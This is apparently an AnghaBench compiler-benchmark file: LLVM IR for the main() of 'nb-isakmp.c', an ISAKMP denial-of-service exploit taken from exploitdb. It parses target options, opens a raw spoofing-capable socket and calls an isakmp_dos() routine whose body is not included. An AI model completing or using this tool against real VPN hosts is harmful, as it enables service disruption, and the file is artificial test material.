; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_21171.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_21171.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.option = type { i8*, i32, i8, i32 }

@.str = private unnamed_addr constant [5 x i8] c"0.4a\00", align 1
@.str.1 = private unnamed_addr constant [75 x i8] c"--- nb-isakmp.c v.%s / Nelson Brito / Independent Security Consultant ---\0A\00", align 1
@SIGHUP = common dso_local global i32 0, align 4
@SIG_IGN = common dso_local global i32 0, align 4
@SIGINT = common dso_local global i32 0, align 4
@u_abort = common dso_local global i32 0, align 4
@SIGTERM = common dso_local global i32 0, align 4
@SIGKILL = common dso_local global i32 0, align 4
@SIGQUIT = common dso_local global i32 0, align 4
@main.my_opt = internal global [8 x %struct.option] [%struct.option { i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i32 1, i8 0, i32 115 }, %struct.option { i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i32 0, i32 0), i32 1, i8 0, i32 100 }, %struct.option { i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0), i32 1, i8 0, i32 112 }, %struct.option { i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i32 1, i8 0, i32 110 }, %struct.option { i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i32 1, i8 0, i32 108 }, %struct.option { i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i32 0, i32 0), i32 0, i8 0, i32 76 }, %struct.option { i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 0, i8 0, i32 104 }, %struct.option zeroinitializer], align 16
@.str.2 = private unnamed_addr constant [7 x i8] c"source\00", align 1
@.str.3 = private unnamed_addr constant [12 x i8] c"destination\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"port\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"number\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"length\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"loop\00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"s:d:p:n:l:Lh\00", align 1
@optarg = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [26 x i8] c"main(): port range error.\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [24 x i8] c"main(): socket() error.\00", align 1
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [28 x i8] c"main(): setsockopt() error.\00", align 1
@ISAKMP_LEN = common dso_local global i32 0, align 4
@.str.13 = private unnamed_addr constant [27 x i8] c"main(): isakmp_dos() error\00", align 1
@.str.14 = private unnamed_addr constant [23 x i8] c"\0ARock my world, baby!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8** %6, align 8
  store i32 0, i32* %10, align 4
  store i32 1, i32* %12, align 4
  store i32 0, i32* %13, align 4
  store i32 0, i32* %14, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %17, align 4
  store i32 0, i32* %18, align 4
  %20 = load i8*, i8** %6, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.1, i64 0, i64 0), i8* %20)
  %22 = load i32, i32* %4, align 4
  %23 = icmp slt i32 %22, 4
  br i1 %23, label %24, label %29

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i8* @usage(i8* %27)
  br label %30

29:                                               ; preds = %2
  br label %30

30:                                               ; preds = %29, %24
  %31 = phi i8* [ %28, %24 ], [ null, %29 ]
  %32 = load i32, i32* @SIGHUP, align 4
  %33 = load i32, i32* @SIG_IGN, align 4
  %34 = call i32 @signal(i32 %32, i32 %33)
  %35 = load i32, i32* @SIGINT, align 4
  %36 = load i32, i32* @u_abort, align 4
  %37 = call i32 @signal(i32 %35, i32 %36)
  %38 = load i32, i32* @SIGTERM, align 4
  %39 = load i32, i32* @u_abort, align 4
  %40 = call i32 @signal(i32 %38, i32 %39)
  %41 = load i32, i32* @SIGKILL, align 4
  %42 = load i32, i32* @u_abort, align 4
  %43 = call i32 @signal(i32 %41, i32 %42)
  %44 = load i32, i32* @SIGQUIT, align 4
  %45 = load i32, i32* @u_abort, align 4
  %46 = call i32 @signal(i32 %44, i32 %45)
  br label %47

47:                                               ; preds = %30, %92
  store i32 0, i32* %19, align 4
  %48 = load i32, i32* %4, align 4
  %49 = load i8**, i8*** %5, align 8
  %50 = call i32 @getopt_long(i32 %48, i8** %49, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i64 0, i64 0), %struct.option* getelementptr inbounds ([8 x %struct.option], [8 x %struct.option]* @main.my_opt, i64 0, i64 0), i32* %19)
  store i32 %50, i32* %9, align 4
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, -1
  br i1 %52, label %53, label %54

53:                                               ; preds = %47
  br label %93

54:                                               ; preds = %47
  %55 = load i32, i32* %9, align 4
  switch i32 %55, label %87 [
    i32 115, label %56
    i32 100, label %61
    i32 112, label %66
    i32 110, label %77
    i32 108, label %80
    i32 76, label %83
    i32 104, label %86
  ]

56:                                               ; preds = %54
  %57 = load i32, i32* @optarg, align 4
  %58 = call i32 @getip(i32 %57)
  store i32 %58, i32* %7, align 4
  %59 = load i32, i32* %16, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %16, align 4
  br label %92

61:                                               ; preds = %54
  %62 = load i32, i32* @optarg, align 4
  %63 = call i32 @getip(i32 %62)
  store i32 %63, i32* %8, align 4
  %64 = load i32, i32* %17, align 4
  %65 = add nsw i32 %64, 1
  store i32 %65, i32* %17, align 4
  br label %92

66:                                               ; preds = %54
  %67 = load i32, i32* @optarg, align 4
  %68 = call i32 @atoi(i32 %67)
  store i32 %68, i32* %10, align 4
  %69 = load i32, i32* %10, align 4
  %70 = icmp sle i32 %69, 0
  br i1 %70, label %74, label %71

71:                                               ; preds = %66
  %72 = load i32, i32* %10, align 4
  %73 = icmp sgt i32 %72, 65535
  br i1 %73, label %74, label %76

74:                                               ; preds = %71, %66
  %75 = call i32 @die(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.10, i64 0, i64 0))
  br label %76

76:                                               ; preds = %74, %71
  br label %92

77:                                               ; preds = %54
  %78 = load i32, i32* @optarg, align 4
  %79 = call i32 @atoi(i32 %78)
  store i32 %79, i32* %14, align 4
  br label %92

80:                                               ; preds = %54
  %81 = load i32, i32* @optarg, align 4
  %82 = call i32 @atoi(i32 %81)
  store i32 %82, i32* %18, align 4
  br label %92

83:                                               ; preds = %54
  %84 = load i32, i32* %13, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %13, align 4
  br label %92

86:                                               ; preds = %54
  br label %87

87:                                               ; preds = %54, %86
  %88 = load i8**, i8*** %5, align 8
  %89 = getelementptr inbounds i8*, i8** %88, i64 0
  %90 = load i8*, i8** %89, align 8
  %91 = call i8* @usage(i8* %90)
  br label %92

92:                                               ; preds = %87, %83, %80, %77, %76, %61, %56
  br label %47

93:                                               ; preds = %53
  %94 = load i32, i32* %16, align 4
  %95 = icmp ne i32 %94, 0
  br i1 %95, label %104, label %96

96:                                               ; preds = %93
  %97 = load i32, i32* %17, align 4
  %98 = icmp ne i32 %97, 0
  br i1 %98, label %104, label %99

99:                                               ; preds = %96
  %100 = load i8**, i8*** %5, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 0
  %102 = load i8*, i8** %101, align 8
  %103 = call i8* @usage(i8* %102)
  br label %104

104:                                              ; preds = %99, %96, %93
  %105 = load i32, i32* @AF_INET, align 4
  %106 = load i32, i32* @SOCK_RAW, align 4
  %107 = load i32, i32* @IPPROTO_RAW, align 4
  %108 = call i32 @socket(i32 %105, i32 %106, i32 %107)
  store i32 %108, i32* %11, align 4
  %109 = icmp slt i32 %108, 0
  br i1 %109, label %110, label %112

110:                                              ; preds = %104
  %111 = call i32 @die(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.11, i64 0, i64 0))
  br label %112

112:                                              ; preds = %110, %104
  %113 = load i32, i32* %11, align 4
  %114 = load i32, i32* @IPPROTO_IP, align 4
  %115 = load i32, i32* @IP_HDRINCL, align 4
  %116 = bitcast i32* %12 to i8*
  %117 = call i64 @setsockopt(i32 %113, i32 %114, i32 %115, i8* %116, i32 4)
  %118 = icmp slt i64 %117, 0
  br i1 %118, label %119, label %121

119:                                              ; preds = %112
  %120 = call i32 @die(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.12, i64 0, i64 0))
  br label %121

121:                                              ; preds = %119, %112
  %122 = load i32, i32* %18, align 4
  %123 = icmp ne i32 %122, 0
  br i1 %123, label %124, label %126

124:                                              ; preds = %121
  %125 = load i32, i32* %18, align 4
  br label %128

126:                                              ; preds = %121
  %127 = load i32, i32* @ISAKMP_LEN, align 4
  br label %128

128:                                              ; preds = %126, %124
  %129 = phi i32 [ %125, %124 ], [ %127, %126 ]
  store i32 %129, i32* %15, align 4
  %130 = load i32, i32* %11, align 4
  %131 = load i32, i32* %7, align 4
  %132 = load i32, i32* %8, align 4
  %133 = load i32, i32* %10, align 4
  %134 = load i32, i32* %14, align 4
  %135 = load i32, i32* %13, align 4
  %136 = load i32, i32* %15, align 4
  %137 = call i32 @isakmp_dos(i32 %130, i32 %131, i32 %132, i32 %133, i32 %134, i32 %135, i32 %136)
  %138 = icmp eq i32 %137, -1
  br i1 %138, label %139, label %141

139:                                              ; preds = %128
  %140 = call i32 @die(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.13, i64 0, i64 0))
  br label %141

141:                                              ; preds = %139, %128
  %142 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.14, i64 0, i64 0))
  ret i32 1
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @usage(i8*) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @getopt_long(i32, i8**, i8*, %struct.option*, i32*) #1

declare dso_local i32 @getip(i32) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i32 @die(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i64 @setsockopt(i32, i32, i32, i8*, i32) #1

declare dso_local i32 @isakmp_dos(i32, i32, i32, i32, i32, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
